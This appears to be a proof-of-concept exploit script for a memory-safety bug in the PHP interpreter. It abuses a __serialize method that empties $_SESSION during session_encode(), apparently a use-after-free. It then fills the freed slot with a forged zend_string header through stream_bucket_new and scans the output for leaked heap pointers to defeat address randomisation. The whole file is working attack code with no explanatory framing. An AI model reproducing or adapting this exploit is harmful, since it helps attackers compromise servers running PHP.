<?php
error_reporting(0);
ini_set('session.serialize_handler', 'php_serialize');
// fake zend_string header: gc.refcount=1, gc.type=IS_STRING(6), h=0, len=8192
$hdr = pack('V', 1) . pack('V', 6) . pack('P', 0) . pack('P', 8192);
$payload = $hdr . str_repeat("M", 4096 - strlen($hdr));
$payload = substr_replace($payload, "LEAKMARK", 24, 8);
$fp = fopen('php://memory', 'w');
class C {
    public $fp, $payload, $keep = [];
    function __construct($fp, $payload) { $this->fp = $fp; $this->payload = $payload; }
    function __serialize() {
        $_SESSION = [];
        $this->keep[] = stream_bucket_new($this->fp, $this->payload);
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C($fp, $payload);
$_SESSION['s'] = str_repeat('A', 4050);   // zend_string alloc 24+4051 -> 4096 bin
$s = session_encode();
echo "len=".(is_string($s)?strlen($s):-1)."\n";
if (is_string($s)) {
  $pos = strpos($s, "LEAKMARK");
  echo "marker=".var_export($pos,true)."\n";
  for ($i=0; $i+7 < strlen($s); $i++) {
    $v = unpack('P', substr($s,$i,8))[1];
    if (($v >> 48) === 0) {
      $top = ($v >> 44) & 0xf;
      if (($top === 7 || $top === 5 || $top === 6) && (($v >> 32) & 0xffff) !== 0) {
        echo "PTR at $i: ".dechex($v)."\n";
      }
    }
  }
}
